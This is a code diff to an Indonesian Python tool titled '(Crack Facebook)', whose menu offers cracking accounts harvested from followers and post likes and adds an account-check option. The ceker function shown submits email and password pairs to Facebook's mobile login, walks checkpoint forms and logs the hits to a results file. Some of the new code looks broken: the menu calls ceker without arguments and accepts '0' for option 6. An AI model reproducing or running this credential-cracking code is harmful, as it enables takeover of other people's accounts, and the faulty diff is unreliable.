@@ -169,7 +169,8 @@ def daftar_menu():
 [bold green]2[bold white]. Crack User Dari Pengikut
 [bold green]3[bold white]. Crack User Dari Like Postingan
 [bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
-[bold green]5[bold white]. Ganti UA""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
+[bold green]5[bold white]. Ganti UA
+[bold green]6[bold white]. cek akun""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
     query = Console().input("[bold hot_pink2]   ╰─> ")
     if query == '1' or query == '01':
         try:
@@ -213,6 +214,8 @@ def daftar_menu():
         except:exit()
     elif query == '5' or query == '05':
         uap()
+    elif query == '6' or query == '0':
+        ceker()
     else:
         Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
 ### DUMP ###
@@ -458,14 +461,14 @@ def ceker(email,pw):
     ses = requests.Session()
     try:
         hi = ses.get('https://mbasic.facebook.com')
-        ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':email,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
+        ho = Parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':email,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
         jo = ho.find('form')
         data = {}
         lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
         for anj in jo('input'):
             if anj.get('name') in lion:
                 data.update({anj.get('name'):anj.get('value')})
-                kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
+                kent = Parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
         print('\r%s++++ %s|%s ----> CP       %s'%(b,email,pw,x))
         open('Results/'+Cp,'a').write(email+'|'+pw+'\n')
         cp+=1
